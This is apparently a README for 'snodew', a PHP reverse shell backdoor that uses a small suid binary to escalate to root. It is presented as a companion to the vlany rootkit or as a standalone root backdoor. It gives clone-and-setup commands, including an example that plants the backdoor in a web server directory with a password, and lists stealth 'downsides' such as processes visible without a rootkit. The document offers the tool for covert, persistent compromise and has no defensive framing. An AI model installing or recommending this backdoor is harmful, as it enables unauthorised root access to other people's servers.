# snodew
*snodew is a PHP reverse shell backdoor which uses a small suid binary to escalate privileges on connection*</br></br>snodew is made mainly to work alongside [vlany](https://github.com/mempodippy/vlany) but can also be setup as a regular root backdoor

## usage
```
git clone https://github.com/mempodippy/snodew.git
cd snodew/
./setup.sh [install dir] [password] [hidden extended attribute] [magic gid]
```

### example usage for regular (non-vlany infected) systems
```
cd /tmp
git clone https://github.com/mempodippy/snodew.git
cd snodew/
./setup.sh /var/www/html/blog sexlovegod X 0 # 'X' and '0' since extended attribute doesn't really matter,
                                             # and our suid binary will set our gid to 0
```
<img src="http://i.imgur.com/YneuIpp.png"/></br>
*Result of successful setup*

<img src="http://i.imgur.com/AwlnKt6.png"/></br>
*Result after following instructions given on our new page*

## downsides
 * sh process spawned from service user is visible
 * if not being used alongside some kind of rootkit, everything you do is visible
 * it's only a reverse shell
 * if using this with vlany, the only user able to see the new files is the service user. this could prove a vulnerability - just su to the user and you can see snodew's files easily
